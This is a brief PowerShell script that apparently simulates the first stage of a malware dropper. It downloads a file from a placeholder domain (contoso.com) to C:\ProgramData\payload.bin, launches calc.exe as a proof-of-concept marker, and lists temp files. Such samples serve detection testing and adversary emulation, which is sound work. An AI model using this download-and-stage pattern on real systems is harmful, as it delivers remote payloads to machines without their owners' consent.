
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://contoso.com/update.dat',
    [string]$LocalPath = 'C:\ProgramData\payload.bin'
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $LocalPath)
Start-Process -FilePath 'calc.exe'
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
